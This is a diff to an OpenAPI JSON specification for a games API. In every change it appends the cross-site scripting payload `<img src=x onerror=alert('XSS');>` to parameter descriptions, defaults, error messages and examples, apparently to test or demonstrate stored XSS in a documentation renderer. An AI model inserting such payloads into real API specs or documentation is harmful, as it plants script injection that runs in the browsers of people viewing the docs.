@@ -15,7 +15,7 @@
           {
             "name": "produceBy",
             "in": "query",
-            "description": "production house name",
+            "description": "production house name<img src=x onerror=alert('XSS');>",
             "required": false,
             "schema": {
               "type": "string",
@@ -171,7 +171,7 @@
           }
         },
         "requestBody": {
-          "description": "",
+          "description": "<img src=x onerror=alert('XSS');>",
           "content": {
             "application/json": {
               "schema": {
@@ -189,11 +189,11 @@
           {
             "name": "gameId",
             "in": "path",
-            "description": "Games unique Identification number",
+            "description": "Games unique Identification number<img src=x onerror=alert('XSS');>",
             "required": true,
             "schema": {
               "type": "string",
-              "default": ""
+              "default": "<img src=x onerror=alert('XSS');>"
             }
           }
         ],
@@ -244,14 +244,14 @@
             "default": 9.4
           }
         },
-        "description": ""
+        "description": "<img src=x onerror=alert('XSS');>"
       },
       "authError": {
         "type": "object",
         "properties": {
           "message": {
             "type": "string",
-            "default": "You do not have accesss!"
+            "default": "You do not have accesss!<img src=x onerror=alert('XSS');>"
           }
         },
         "description": ""
@@ -267,7 +267,7 @@
         "description": "",
         "example": [
           {
-            "ErrorMsg": "Please provide a valid ID"
+            "ErrorMsg": "Please provide a valid ID<img src=x onerror=alert('XSS');>"
           }
         ]
       }
